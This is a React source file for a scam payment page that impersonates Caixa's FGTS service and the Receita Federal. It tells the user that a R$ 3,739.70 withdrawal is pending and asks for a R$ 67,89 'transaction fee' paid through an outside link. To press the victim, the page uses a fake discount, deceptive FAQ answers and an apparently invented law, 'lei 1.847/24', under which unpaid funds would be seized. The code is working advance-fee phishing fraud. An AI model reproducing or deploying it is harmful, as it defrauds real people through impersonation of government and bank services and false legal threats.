import { useEffect, useState } from "react";
import logo from "../assets/caixalogo.png";
import logofgts from "../assets/fgts2.png";
import { IoIosWarning } from "react-icons/io";
import { HiChevronRight } from "react-icons/hi";
import { Helmet } from "react-helmet";
import { UserData } from "../types/userData";
import pix from "../assets/pix.png"

export function PagamentoTarifa() {

    const [userData, setUserData] = useState<UserData>({
        nome: "",
        cpf: "",
        dataNascimento: "",
        email: "",
        cep: "",
        cidade: "",
        estado: "",
        rua: "",
        numero: ""
    });

    // Carregar os dados do localStorage ao montar o componente
    useEffect(() => {
        const storedUserData = localStorage.getItem("userData");
        if (storedUserData) {
            setUserData(JSON.parse(storedUserData));
        }
    }, []);

    useEffect(() => {
        document.title = "Pagamento da Tarifa - Receita Federal";
    }, []);

    const [activeIndex, setActiveIndex] = useState<number | null>(null);
    const [displayedAmount, setDisplayedAmount] = useState(0);
    const totalAmount = 3739.70; // Valor total

    // Função para alternar perguntas
    const toggleQuestion = (index: number) => {
        setActiveIndex(activeIndex === index ? null : index);
    };

    const questions = [
        {
            question: "Por que é cobrado uma taxa de R$ 67,89?",
            answer: "A taxa de R$ 67,89 é aplicada para cobrir os custos operacionais da transação, incluindo a administração e a segurança do seu saque. Essa tarifa garante que todo o processo seja realizado de maneira eficiente e segura, proporcionando a você um serviço confiável."
        },
        {
            question: "Por que vocês não descontam a taxa do meu saque?",
            answer: "Descontar a taxa do saque não é viável devido às políticas financeiras que regem essas transações. Ao manter a taxa separada, asseguramos que o valor total do seu saque permaneça intacto até que você opte por efetuar o pagamento, permitindo mais controle sobre seus recursos."
        },
        {
            question: "Quais são as formas de pagamento?",
            answer: "Oferecemos diversas opções de pagamento para facilitar sua experiência, incluindo cartões de crédito, débito e transferências bancárias. Assim, você pode escolher a forma que melhor se adapta às suas necessidades e garantir que seu saque seja liberado rapidamente."
        },
        {
            question: "Como faço para sacar rápido sem esperar as 2 horas?",
            answer: "Para garantir que seu saque seja processado rapidamente, recomendamos que você realize o pagamento da tarifa o mais rápido possível. Assim que o pagamento for confirmado, seu saque será priorizado, permitindo que você receba os fundos em um prazo muito mais curto."
        },
        {
            question: "Qual a garantia que tenho para efetuar o saque dos valores bloqueados?",
            answer: "A segurança é a nossa prioridade. Todos os processos são realizados dentro das diretrizes da Receita Federal, garantindo que seus valores bloqueados sejam liberados com segurança e em conformidade com as leis vigentes. Você pode confiar que estamos aqui para proteger seus interesses."
        },
        {
            question: "Como posso acompanhar meu pedido de saque?",
            answer: "Você pode acompanhar seu pedido de saque através do nosso portal. Assim que seu pedido for processado, você receberá atualizações em tempo real sobre o status da sua transação, garantindo que você esteja sempre informado sobre o que está acontecendo com seus fundos."
        }
    ];

    // Animação do valor
    useEffect(() => {
        let start = 0;
        const end = totalAmount;
        const duration = 3000; // Duração da animação em milissegundos (3 segundos)
        const increment = Math.ceil(end / (duration / 100)); // Incremento de valor a cada 100 ms

        const intervalId = setInterval(() => {
            if (start < end) {
                start += increment;
                if (start > end) start = end; // Evitar ultrapassar o valor total
                setDisplayedAmount(start);
            } else {
                clearInterval(intervalId);
            }
        }, 100); // Atualiza a cada 100 ms

        return () => clearInterval(intervalId);
    }, [totalAmount]);

    return (
        <div className="flex flex-col items-center justify-center w-full min-h-screen bg-white pb-8">
            {/* Cabeçalho */}
            <header className="flex w-full flex-col p-4 bg-[#025bab] text-white mb-8">
                <div className="flex items-center justify-between w-full">
                    <div className="flex items-center space-x-3">
                        <img width={34} src={logo} alt="logo" />
                        <span className="text-white font-extralight">Olá, {userData.nome.split(" ")[0]}</span>
                    </div>
                    <img src={logofgts} alt="fgts" width={65} />
                </div>
            </header>

            <div className="px-4">
                <div className="flex flex-col items-center w-full max-w-lg px-2 bg-white shadow-lg rounded-lg space-y-4">
                    <div className="flex items-center pt-4">
                        <IoIosWarning className="text-orange-500 mr-2" size={36} />
                        <h2 className="text-3xl font-bold text-orange-500">ATENÇÃO!</h2>
                    </div>

                    <h2 className="text-4xl font-bold text-center text-gray-800 mt-2">
                        Seu saque <br />de <span className="text-primary ">R$ {displayedAmount.toFixed(2)}</span> <br />está <span className="text-orange-500">pendente</span>
                    </h2>
                    <div className="text-2xl font-semibold text-center text-gray-700 mt-2">
                        Aguardando pagamento da <span className="text-green-600">Tarifa Transacional</span>
                    </div>
                    <p className="text-gray-600 text-center">
                        Assista o vídeo abaixo para saber mais sobre a taxa
                    </p>

                    {/* VSL (Video Sales Letter) */}
                    <div className="w-full">
                        <div dangerouslySetInnerHTML={{ __html: '<div id="vid_67229a0fee8801000b90f3c0" style="position:relative;width:100%;padding: 133.33333333333331% 0 0;"> <img id="thumb_67229a0fee8801000b90f3c0" src="https://images.converteai.net/e5cc2817-09a8-45cb-a70b-789a99211f8a/players/67229a0fee8801000b90f3c0/thumbnail.jpg" style="position:absolute;top:0;left:0;width:100%;height:100%;object-fit:cover;display:block;"> <div id="backdrop_67229a0fee8801000b90f3c0" style="position:absolute;top:0;width:100%;height:100%;-webkit-backdrop-filter:blur(5px);backdrop-filter:blur(5px);"></div> </div>' }} />
                        <Helmet>
                            <script type="text/javascript" id="scr_67229a0fee8801000b90f3c0"> var s=document.createElement("script"); s.src="https://scripts.converteai.net/e5cc2817-09a8-45cb-a70b-789a99211f8a/players/67229a0fee8801000b90f3c0/player.js", s.async=!0,document.head.appendChild(s); </script>
                        </Helmet>
                    </div>

                    <div className="text-center space-y-2">
                        <h3 className="text-lg font-thin text-zinc-700">
                            Pague a tarifa para receber seu FGTS em até <span className="text-green-600 font-semibold">3 minutos!</span>
                        </h3>
                        <p className="text-gray-600">Pague hoje com desconto de:</p>
                        <p className="text-2xl font-thin text-zinc-400">R$: 127,65 por apenas: </p>
                        <div className="flex justify-center space-x-6">
                            <img src={pix} alt="pic" width={100} />
                            <p className="text-3xl font-extrabold text-green-700">R$ 67,89</p>
                        </div>
                    </div>

                    <p className="text-gray-600 text-center mt-4">
                        Clique no botão abaixo para realizar o pagamento da tarifa transacional e receber o seu saque!
                    </p>

                    <a href="https://pay.pagamentofgt.shop/KV603k01qyEZw8y" className="w-full">
                        <button className="bg-orange-400 w-full py-3 font-bold rounded-md text-white mt-4 hover:bg-orange-500 focus:outline-none focus:ring-2 focus:ring-orange-300">
                            Realizar Pagamento
                        </button>
                    </a>



                    <div>
                        <p className="text-zinc-400 font-semibold text-center mt-4 text-sm">
                            AVISO IMPORTANTE: Seu saque já está em processo de liberação, basta seguir para próxima página e concluir o pagamento da tarifa transacional, caso você não conclua o valor disponível será imediatamente bloqueado e disponibilizado ao Tesouro Nacional conforme lei 1.847/24!
                        </p>

                        <h3 className="text-lg font-semibold text-center text-gray-800 mt-10 mb-10">
                            SOMENTE APÓS A <span className="text-green-600">CONFIRMAÇÃO DO PAGAMENTO</span> DESTA TAXA, O SEU SAQUE SERÁ CONCLUÍDO!
                        </h3>

                    </div>
                    <h4 className="text-lg font-semibold text-gray-800 mt-4">DÚVIDAS FREQUENTES</h4>
                    <div className="w-full">
                        {questions.map((item, index) => (
                            <div key={index} className="border-b">
                                <button
                                    className="flex justify-between w-full text-left py-2 text-gray-700 hover:text-gray-900 focus:outline-none bg-white"
                                    onClick={() => toggleQuestion(index)}
                                >
                                    <h5 className="font-semibold">{item.question}</h5>
                                    <HiChevronRight
                                        className={`transform transition-transform duration-300 ${activeIndex === index ? 'rotate-90' : ''}`}
                                        size={24}
                                    />
                                </button>
                                <div
                                    className={`overflow-hidden transition-all duration-300 ${activeIndex === index ? 'max-h-40' : 'max-h-0'}`}
                                >
                                    <p className="text-gray-600 text-sm mb-2 p-2">
                                        {item.answer}
                                    </p>
                                </div>
                            </div>
                        ))}

                        <a href="https://pay.pagamentofgt.shop/KV603k01qyEZw8y" className="w-full">
                            <button className="bg-orange-400 w-full py-3 font-bold rounded-md text-white mt-4 hover:bg-orange-500 focus:outline-none focus:ring-2 focus:ring-orange-300">
                                Realizar Pagamento
                            </button>
                        </a>
                    </div>
                </div>
            </div>
        </div>
    );
}
